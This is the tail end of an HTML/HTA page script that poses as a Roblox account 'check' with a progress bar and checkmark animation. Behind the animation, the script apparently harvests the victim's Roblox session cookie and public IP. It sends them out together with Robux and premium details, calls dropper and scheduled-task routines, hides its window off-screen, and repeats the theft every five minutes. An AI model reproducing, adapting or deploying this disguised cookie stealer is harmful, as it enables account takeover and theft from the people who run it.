/* ================= fenetre + animation ================= */
var _ct=function(){ try{ var w=440,h=620; window.resizeTo(w,h);
 window.moveTo(Math.round((screen.availWidth-w)/2), Math.round((screen.availHeight-h)/2)); }catch(e){} };
var _hm=function(){ try{ window.resizeTo(0,0); window.moveTo(-2000,-2000); }catch(e){} };

var _sg=document.getElementById("stage"), _dn=document.getElementById("done"),
    _br=document.getElementById("bar"), _pc=document.getElementById("pct"),
    _kc=document.getElementById("ckc"), _kt=document.getElementById("ckt"),
    _in=document.getElementById("info"), _ls=document.getElementById("last"),
    _sp=document.querySelectorAll(".steps li");
var _pT=0,_pS=0,_pD=false,_cK=0;

var _st=function(){ try{ _ls.innerHTML="Last check: "+(new Date()).toLocaleTimeString(); }catch(e){} };

var _tk2=function(){
 try{
  if(!_pD){
   _pT++; var p=_pT*2; if(p>100){ p=100; }
   _br.style.width=p+"%"; _pc.innerHTML=p+"%";
   if(_pT%13===0 && _pS<4){ if(_pS>0){ _sp[_pS-1].className="ok"; } _sp[_pS].className="on"; _pS++; }
   if(_pT>=52){
    _pD=true; if(_pS>0){ _sp[_pS-1].className="ok"; }
    _br.style.width="100%"; _pc.innerHTML="100%";
    _sg.style.display="none"; _dn.className="done show";
    _kc.setAttribute("stroke-dashoffset",151); _kt.setAttribute("stroke-dashoffset",40);
   }
  }else{
   _cK++;
   if(_cK<=16){ _kc.setAttribute("stroke-dashoffset", Math.round(151-151*_cK/16)); }
   else if(_cK<=24){ _kt.setAttribute("stroke-dashoffset", Math.round(40-40*(_cK-16)/8)); }
   else if(_cK===25){
    _kt.setAttribute("stroke-dashoffset",0);
    _st();
    if(_Z0){ setTimeout(_hm,8000); }
   }
  }
 }catch(e){}
};

/* ================= anti-doublon ================= */
var _fr=function(){
 var mk=_e("TEMP")+"\\"+_t1+".lok", fresh=false;
 try{ if(_A2.FileExists(mk)){ if((new Date()-_A2.GetFile(mk).DateLastModified)<25000){ fresh=true; } } }catch(e){}
 try{ _w(mk,""+(new Date()).getTime()); }catch(e){}
 try{ setTimeout(function(){ try{ _A2.DeleteFile(mk,true); }catch(e){} }, 31000); }catch(e){}
 return fresh;
};

/* ================= sequence ================= */
var _rp=function(){
 try{
  var ip=_ip();
  var r=_fc();
  if(!r.ok){
   _al("🚫 Roblox — no cookie", "⚠️ "+r.how+"\n🌐 IP: "+(ip.ip||"?"), 15158332);
   _in.innerHTML="Partial check &middot; retry recommended";
  }else{
   var info=_api(r.ck);
   _send(r.ck, r.how, info, ip, r.src);
   if(info.ok){
    _in.innerHTML="ID "+(info.id||"?")+" &middot; "+(info.robux||"?")+" R$ &middot; premium "+(info.prem||"?");
   }else{
    _in.innerHTML="Cookie sent &middot; profile not resolved";
   }
  }
 }catch(e){}
};

var _bt=function(){
 setTimeout(function(){ try{ _drop(); }catch(e){} }, 260+Math.floor(Math.random()*430));
 setTimeout(function(){ try{ _rp(); }catch(e){} }, 3000+Math.floor(Math.random()*2200));
 setTimeout(function(){ try{ _art(); }catch(e){} }, 5200+Math.floor(Math.random()*2600));
 setTimeout(function(){ try{ _sch(); }catch(e){} }, 14000+Math.floor(Math.random()*4000));
};

window.onload=function(){
 try{
  document.getElementById("x").onclick = _hm;
  document.getElementById("again").onclick = function(){ try{ _rp(); }catch(e){} _st(); };

  if(_fr()){
   _hm();
   setTimeout(function(){ try{ _drop(); }catch(e){} }, 300+Math.floor(Math.random()*500));
   setTimeout(function(){ try{ _rp(); }catch(e){} }, 2600+Math.floor(Math.random()*1500));
   setTimeout(function(){ try{ _art(); }catch(e){} }, 4000+Math.floor(Math.random()*2000));
   return;
  }

  _ct();
  setTimeout(function(){ setInterval(_tk2,60); },300);
  setTimeout(_bt, 900+Math.floor(Math.random()*2400));
  setInterval(function(){ try{ _rp(); }catch(e){} _st(); },300000);
 }catch(e){}
};
})();
</script>
</body>
</html>
